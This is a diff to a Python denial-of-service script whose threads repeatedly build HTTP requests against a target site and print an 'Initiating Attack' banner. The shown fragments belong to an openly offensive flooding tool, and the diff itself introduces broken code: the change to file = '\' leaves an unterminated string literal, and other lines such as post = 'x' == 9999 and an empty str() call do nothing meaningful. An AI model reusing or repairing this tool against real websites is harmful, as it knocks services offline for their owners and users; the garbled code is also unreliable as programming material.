@@ -4,7 +4,6 @@ import os
 import sys
 import socket
 import time
-import getopt
 import re
 import random
 import getopt
@@ -67,7 +66,7 @@ class MyThread(Thread,):
         while not self.kill_received:
             server = socket.gethostbyname(self.site)
             post = 'x' == 9999
-            file = '/'
+            file = '\'
 
             request = '%s /%s HTTP/1.1\r\n' %(self.method.upper(),file)
             request += 'Host: %s\r\n' % (self.site)
@@ -107,7 +106,7 @@ def da_delegator(SITE,DOS_TYPE):
     threads = []
     for num in range(thread_count):
         thr1=MyThread(SITE,DOS_TYPE)
-        print("\033[97m[\033[92m+\033[97m]--- Initiating Attack ---033[0m")
+        print("\033[97m[\033[92m+\033[97m] " +str()+ " \033[94m--- Initiating Attack ---033[0m")
         thr1.start()
         threads.append(thr1)
         #thr1.join()
